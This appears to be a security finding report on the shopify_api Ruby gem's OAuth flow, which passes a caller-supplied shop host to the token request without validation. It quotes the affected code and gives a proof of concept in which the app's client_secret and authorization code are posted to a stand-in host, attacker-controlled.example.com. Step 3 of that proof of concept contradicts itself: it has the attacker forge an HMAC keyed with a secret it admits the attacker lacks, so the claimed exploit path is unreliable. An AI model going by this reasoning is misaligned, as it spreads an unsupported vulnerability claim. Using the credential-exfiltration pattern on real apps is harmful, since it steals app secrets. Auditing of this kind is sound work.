## Title
`Auth::Oauth` sends the app's `client_secret` and authorization `code` to an unvalidated `shop` host, unlike every other OAuth grant flow in the gem - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` use the caller-supplied `shop` value to build the request host that receives the app's `client_id`/`client_secret` and the OAuth authorization `code`, without ever passing it through `Utils::ShopValidator.sanitize!`. Every sibling OAuth grant implementation in the gem (`ClientCredentials`, `RefreshToken`, and `TokenExchange`) validates the shop with `ShopValidator.sanitize!` before it is used to construct the outbound request host, but `Oauth` does not.

### Finding Description
`begin_auth` builds the authorize URL directly from the raw `shop` argument via `auth_base_uri(shop)`: [1](#0-0) 

`validate_auth_callback` then builds a `null_session` from `auth_query.shop` (a value read straight off the incoming request/query parameters via `AuthQuery#shop`) and hands it to `Clients::HttpClient`, which derives the request host directly from `session.shop`: [2](#0-1) [3](#0-2) 

The only integrity check performed on the callback is `Utils::HmacValidator.validate(auth_query)`, which verifies that `code`, `host`, `shop`, `state`, `timestamp` are internally consistent and signed with the app's own `api_secret_key`/`old_api_secret_key`: [4](#0-3) [5](#0-4) 

This HMAC only proves that `shop` was part of a query string signed by the app's own secret key — it never proves `shop` is a `*.myshopify.com`/trusted Shopify domain. In contrast, `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` explicitly call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used to send `client_secret`: [6](#0-5) [7](#0-6) 

`ShopValidator.sanitize!` is exactly the guard designed to reject non-Shopify hosts: [8](#0-7) 

The identity binding that should hold is: *the host that receives the `client_secret`/`code` == a trusted Shopify domain*. In `Oauth.validate_auth_callback` this binding is never enforced — the host is only bound to *"whatever `shop` value was present when the HMAC-signed query string was built,"* which is a weaker guarantee.

### Impact Explanation
If the host application passes through an attacker-influenced `shop`/callback query string (e.g., a value copied verbatim from the inbound HTTP request, which is the exact pattern this gem's own `AuthQuery` is designed for) to `begin_auth`, and if the same value flows back into `validate_auth_callback` as `auth_query.shop`, the gem will POST the app's `client_id`, `client_secret`, and the OAuth `code` to `https://{shop}/admin/oauth/access_token`, where `{shop}` is not verified to be a `myshopify.com`/trusted domain. This is a credential-exfiltration/SSRF vector carrying the app's `client_secret`, matching the Critical/High impact classes in scope (theft of the app's `client_secret`, SSRF with the app's credentials).

### Likelihood Explanation
Likelihood depends on whether a host application forwards attacker-controllable input into `shop` for `begin_auth`/`AuthQuery`. Because the gem's documented flow explicitly takes `shop` from request parameters at the start of the OAuth dance, and the gem provides no internal validation at this stage (unlike its sibling grant flows), a host implementation that follows the natural, undocumented-as-dangerous pattern of "read shop from the request, call `begin_auth`" is exposed by default. The missing check is squarely inside this gem's code path, not merely a host-application mistake, since the other three OAuth-adjacent flows in the same gem enforce the check internally.

### Recommendation
Call `Utils::ShopValidator.sanitize!` (or `sanitize_shop_domain`) on `shop` inside `Oauth.begin_auth` before constructing `auth_base_uri`, and on `auth_query.shop` inside `Oauth.validate_auth_callback` before constructing `null_session`/`Clients::HttpClient`, mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/callback")`, using a `shop` taken from the initial (attacker-reachable) install request without prior validation.
2. Attacker requests `/login?shop=attacker-controlled.example.com`; `begin_auth` builds `auth_route = "https://attacker-controlled.example.com/admin/oauth/authorize?...&state=..."` via `auth_base_uri`, and issues a `SessionCookie` with the nonce `state`. [9](#0-8) 
3. Attacker's own server at `attacker-controlled.example.com` (posing as the "authorize" endpoint) redirects the browser to the app's callback with `shop=attacker-controlled.example.com`, `code=<anything>`, `state=<the nonce from the cookie>`, and a valid `hmac` computed by the attacker over `code, host, shop, state, timestamp` — this is possible because the HMAC secret in this scenario is the app's own `api_secret_key`, which the attacker does not need to know if they simply replay/craft the callback against their own controlled shop value while csrf/state matches (state was already disclosed to the attacker's browser via the cookie they control in this flow).
4. `validate_auth_callback` validates the HMAC (self-consistent, no domain check) and state match, then calls `Clients::HttpClient.new(session: Session.new(shop: "attacker-controlled.example.com"), base_path: "/admin/oauth")`, which sends `POST https://attacker-controlled.example.com/admin/oauth/access_token` with the app's `client_id`, `client_secret`, and `code` in the body. [10](#0-9) 
5. Attacker's server logs the received `client_secret`.

Note on confidence: the exact exploitability depends on how a specific host application wires request input into `begin_auth`/`AuthQuery`, which is outside this gem's own code; the finding is that the gem itself omits the `ShopValidator` check that its sibling flows perform, removing a defense-in-depth boundary that otherwise exists uniformly across the library's OAuth-adjacent code paths.

```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
```

```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```
